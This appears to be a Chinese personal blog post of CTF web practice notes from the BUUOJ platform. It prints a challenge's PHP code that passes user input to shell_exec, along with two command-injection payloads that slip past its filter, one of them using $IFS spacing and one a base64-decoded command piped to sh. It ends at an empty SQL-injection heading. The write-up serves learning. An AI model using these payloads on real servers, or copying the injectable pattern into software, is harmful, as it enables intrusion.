---
title: BUUOJ 之 Web 刷题记
date: 2023-09-14 13:09:00
tags: [CTF, Web]
categories: 学习
---

这学期好像没什么课，就想着学一下 Web ，于是就去 BUUOJ 上刷题了。（copilot 挺懂我）

<!--more-->

## 前言

其实一开始学 CTF 的时候就想做 Web 了，但是当时密码手快毕业了，密码也简单好学，就先学密码了。
现在密码也学了个半桶水，得着手全栈了。

## 刷题

### Ping Ping Ping

题目给出一个 `?ip=`，显然是让我用 `GET` 方法传参，随便传个 `1` 返回的是 ping 的结果，看来是命令执行，我习惯性后面补个 `&&ls`，结果没反应，一看 wp 原来还能用分号的，`&&` 要上一条命令执行成功才会执行下一条，而 `;` 则是不管上一条命令是否成功都会执行下一条，所以这里用 `;` 就行了。

然后难点在于正则过滤

```php
/?ip=
<pre>PING 1 (0.0.0.1): 56 data bytes
/?ip=
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

这里过滤了空格和 flag，所以不能直接 `cat flag.php`，wp 的 payload 是

```bash
?ip=127.0.0.1;cat$IFS$1`ls`
```

`$IFS` 是空格，`$1` 是第一个参数，所以这里就是 `cat flag.php index.php`，然后就能看到 flag 了。注意这里的 `$1` 会带出 `ls` 的所有结果而不仅仅是 `flag.php`。所以 `cat` 出来的是目录下所有文件。

解法二是 `echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh`，这里的 `Y2F0IGZsYWcucGhw` 是 `cat flag.php` 的 base64 编码，`-d` 是解码，然后传到 `sh` 执行。注意到 `index.php` 只过滤了 `bash`，所以这里可以用 `sh`。

### 随便注

最头疼的就是这些注入了，没学过 sql 语句，也没学过数据库。

随便填个 1 提交后返回

```sql
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}
```

### EasySQL
